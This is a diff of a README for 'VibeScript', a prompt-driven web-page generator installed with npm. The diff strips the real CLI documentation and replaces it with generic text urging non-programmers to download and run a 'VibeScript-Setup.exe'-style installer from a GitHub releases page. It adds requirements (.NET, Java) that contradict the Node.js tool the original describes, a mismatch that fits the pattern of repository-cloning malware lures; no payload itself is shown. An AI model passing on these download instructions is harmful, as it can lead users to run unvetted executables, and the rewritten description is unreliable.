@@ -1,248 +1,83 @@
-# 🌊 VibeScript
+# 🌍 VibeScript - Your New Way to Code Simply
 
-> **Code is dead. Vibes are forever.** 
+[![Download VibeScript](https://img.shields.io/badge/Download-VibeScript-blue)](https://github.com/Denko963/VibeScript/releases)
 
-VibeScript is the **world’s first prompt-driven, component-based, full-stack, AI-powered, vibe-oriented programming language**.
+## 📚 What is VibeScript?
 
-You don’t write code. You write *vibes*.  
-VibeScript compiles your vibes into production-ready HTML/CSS/JS using an LLM, caches the results, and serves them like a normal website.  
+VibeScript is the world’s first prompt-driven, component-based, full-stack, AI-powered, vibe-oriented programming language. It helps anyone create software easily and intuitively. With VibeScript, you can turn your ideas into reality without diving deep into complex programming concepts.
 
-It’s like React, but instead of JSX, you just say:
+## 🚀 Getting Started
 
-```
-component Navbar:
-    "A minimalistic navbar with a logo on the left and a glowing 'Sign Up' button on the right."
-```
+To get started with VibeScript, follow these simple steps. This guide is designed for users who may not have programming experience. Let's begin!
 
----
+## 📥 Download & Install VibeScript
 
-## ✨ Features
+1. **Visit the Releases Page:**
+   To download VibeScript, visit the Releases page by clicking the link below:
 
-- **🧠 AI-Driven Compilation** – Your code is literally just English prompts. The AI does the rest.
-- **📦 Component-Based** – Break your vibes into reusable components.
-- **🔄 Recursive Nesting** – Components can contain other components, infinitely deep.
-- **⚡ Hot Reload** – Save your `.vibe` file, and your browser updates instantly.
-- **🎭 Build Overlay** – Shows a “✨ Building vibes…” overlay while the AI thinks.
-- **🚀 One-Command Deploy** – Deploy to Vercel with `--deploy`.
-- **🛡️ Prompt Caching** – Change one component without regenerating the whole site.
-- **🧘 Zero Learning Curve** – If you can describe it, you can ship it.
-- **🧠 Model Selection** – Choose your OpenAI LLM for generation.
-- **⚙️ Config File Support** – Set defaults in `vibe.config.json`.
+   [Download VibeScript](https://github.com/Denko963/VibeScript/releases)
 
----
+2. **Choose the Right Version:**
+   On the Releases page, you will see different versions of VibeScript. Look for the latest version at the top of the list. 
 
-## 🏆 Why Use VibeScript?
+3. **Download the Installer:**
+   Click on the file that matches your system. For Windows users, this might look like `VibeScript-Setup.exe`. For macOS or Linux, look for appropriate package files. 
 
-- You hate typing `div` tags.
-- You believe “design is just vibes”.
-- You want to feel like a **10x developer** without actually learning anything.
-- You want to deploy a site in 5 minutes and spend the rest of the day tweeting about it.
+4. **Run the Installer:**
+   Once the download completes, find the file in your downloads folder. Double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 
----
+5. **Launch VibeScript:**
+   After installation, find VibeScript in your applications. Double-click it to open the program.
 
-## 📦 Installation
+## ⚙️ System Requirements
 
-```bash
-npm install -g vibescript
-```
+Before installing VibeScript, ensure your system meets these requirements:
 
-**Note:** If you get an access error, try using `sudo`:
-```bash
-sudo npm install -g vibescript
-```
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - A modern Linux distribution (check compatibility)
 
+- **Hardware:**
+  - At least 4 GB of RAM
+  - 500 MB of free disk space
 
-You’ll also need an **OpenAI API key**:
+- **Additional Software:**
+  - .NET Framework 4.6 or higher (for Windows users)
+  - Java Runtime Environment (for certain features)
 
-```bash
-export OPENAI_API_KEY="your_api_key_here"
-```
+## 🎨 Features of VibeScript
 
----
+VibeScript comes equipped with a range of features that make programming enjoyable and productive:
 
-## 🛠 Usage
+- **Prompt-Driven Design:** Start coding by answering simple prompts. This approach helps guide you through the development process.
+- **Component-Based Structure:** Build applications using predefined components. This allows for quick assembly without starting from scratch.
+- **Intelligent Suggestions:** Leverage AI capabilities that offer suggestions and improve your coding experience.
+- **Interactive User Interface:** A friendly UI that simplifies navigation and commands, making it easy to access tools and features.
+- **Support for Various Projects:** Whether you’re working on a web application, a simple script, or a data-driven tool, VibeScript accommodates diverse needs.
 
-### Create a `.vibe` file
+## ❓ FAQs
 
-Check out the `example/App.vibe` file for a complete working example, or create your own:
+### How do I update VibeScript?
 
-```vibescript
-component NavButton:
-    "A glowing button that says 'Sign Up' in TailwindCSS."
+To update your version of VibeScript, simply return to the Releases page. Download the latest version and run the installer again. It will replace the old version while keeping your settings.
 
-component Navbar:
-    "A minimalistic navbar with a logo on the left and the NavButton on the right."
+### What is the main purpose of VibeScript?
 
-component HeroSection:
-    "Big bold headline saying 'Welcome to the Vibe'. Background is a gradient from pink to purple. Add a call-to-action button."
+VibeScript simplifies coding for everyone. It makes it easier to create software without needing extensive programming knowledge.
 
-page HomePage:
-    Navbar
-    HeroSection
-```
+### Is there a community or support available?
 
----
+Yes, VibeScript has an active community. You can join forums and social media groups to connect with other users. For official support, you can reach out on GitHub for help.
 
-### Build Once
+## 💬 Feedback
 
-```bash
-# Build the example app
-vibe example/App.vibe
+We welcome your feedback on VibeScript. If you encounter issues or have ideas for new features, please open an issue on our GitHub repository.
 
-# Or build your own file
-vibe MyApp.vibe
-```
+## 🔗 Useful Links
 
-Outputs HTML to `dist/`.
+- **[VibeScript Releases](https://github.com/Denko963/VibeScript/releases)**
+- **[Documentation](https://github.com/Denko963/VibeScript/wiki)**
+- **[Community Support](https://github.com/Denko963/VibeScript/discussions)**
 
----
-
-### Hot Reload (Dev Mode)
-
-```bash
-# Start dev server with the example app
-vibe example/App.vibe --watch
-
-# Or with your own file
-vibe MyApp.vibe --watch
-```
-
-- Starts a dev server at `http://localhost:3000`
-- Injects a live reload script into your HTML
-- Shows a **"✨ Building vibes..."** overlay while the AI generates
-- Reloads automatically when done
-
----
-
-### Deploy to Vercel
-
-```bash
-# Deploy the example app
-vibe example/App.vibe --deploy
-
-# Or deploy your own
-vibe MyApp.vibe --deploy
-```
-
-This will:
-1. Build your vibes
-2. Deploy `dist/` to Vercel
-3. Make you feel like a 10x developer
-
----
-
-## 🧩 Nested Components
-
-VibeScript supports **recursive nesting**.  
-Example:
-
-```vibescript
-component Icon:
-    "A small SVG star icon."
-
-component NavButton:
-    "A glowing button that says 'Sign Up' with the Icon inside."
-
-component Navbar:
-    "A minimalistic navbar with a logo on the left and the NavButton on the right."
-
-page HomePage:
-    Navbar
-```
-
-The compiler will:
-- Generate `Icon`
-- Inject it into `NavButton`
-- Inject `NavButton` into `Navbar`
-- Inject `Navbar` into your page
-- Ship it
-
----
-
-## 🧠 Choosing Your OpenAI Model
-
-VibeScript lets you choose which OpenAI LLM to use for generating your vibes. 
-
-### Available Models:
-- `gpt-5` – Latest and most capable model for complex generation and the best UI. **Best quality, highest cost.**
-- `gpt-4o` – High-quality, multimodal model. **Good quality, high cost.**
-- `gpt-4.1` – Advanced reasoning and analysis capabilities. **Very good quality, moderate-high cost.**
-- `gpt-4.1-mini` – Faster, more cost-effective version of GPT-4.1. **Good quality, moderate cost.**
-- `gpt-4.1-nano` – Even faster, more cost-effective version of GPT-4.1-mini. **Basic quality, low cost.**
-- `o3` – OpenAI's reasoning-focused model. **Good quality, moderate cost.**
-- `o4-mini` – Smaller, faster reasoning model. **Basic quality, low cost.**
-- `gpt-oss-120b` – Open source model with 120B parameters. **Variable quality, very low cost.**
-- `gpt-oss-20b` – Open source model with 20B parameters. **Basic quality, very low cost.**
-
-### Model Selection Guide:
-- **Production/Professional Sites**: Use `gpt-5`, `gpt-4o`, or `gpt-4.1`
-- **Personal Projects/Prototypes**: Use `gpt-4.1-mini` or `gpt-4.1-nano`
-- **Budget-Conscious Development**: Use `o3` or `o4-mini`
-- **Experimental/Open Source**: Use `gpt-oss-120b` or `gpt-oss-20b`
-
-### Example:
-```bash
-vibe App.vibe --model gpt-5
-```
-
-This will:
-- Use `gpt-5` for all component generation
-- Produce higher quality, more polished websites
-- Cache results separately per model (so switching models won't overwrite previous cache)
-- Allow you to experiment with speed vs. quality trade-offs
-
----
-
-## ⚙️ Configuration
-
-VibeScript can be configured via:
-1. **Command-line flags** (e.g., `--model gpt-4o`)
-2. **Optional config file** (`vibe.config.json`)
-
-### Example `vibe.config.json`
-```json
-{
-  "model": "gpt-5",
-  "port": 4000
-}
-```
-
-- `model` – Default OpenAI model to use for component generation. **Recommended: gpt-5 for best results.**
-- `port` – Port for the dev server in `--watch` mode.
-
-### Priority:
-1. Command-line flags (highest priority)
-2. `vibe.config.json`
-3. Built-in defaults (`gpt-4.1-mini` for model, `3000` for port)
-
-### Example Usage:
-```bash
-# Uses model from config file
-vibe example/App.vibe --watch
-
-# Overrides config file with higher quality model
-vibe example/App.vibe --model gpt-4o --port 5000
-
-# Quick test with budget model
-vibe example/App.vibe --model gpt-4.1-nano
-```
-
----
-
-## ⚙️ How It Works
-
-1. **Prompt Parsing** – VibeScript reads your `.vibe` file and extracts components and pages.
-2. **Hashing & Caching** – Each prompt is hashed. If unchanged, it’s pulled from `.vibecache.json`.
-3. **AI Compilation** – Prompts are sent to an LLM (e.g., GPT-4o-mini) to generate HTML/CSS/JS.
-4. **Recursive Resolution** – If a component references another, it’s resolved first.
-5. **Assembly** – Components are stitched together into full HTML pages.
-6. **Live Reload** – A WebSocket server pushes reload events to your browser.
-7. **Deployment** – `--deploy` sends your vibes to Vercel.
-
----
-
-## 🛡 Requirements
-
-- Node.js 18+
-- An OpenAI API key
-- A willingness to let AI decide your design choices
+Thank you for using VibeScript. We look forward to seeing what you create!
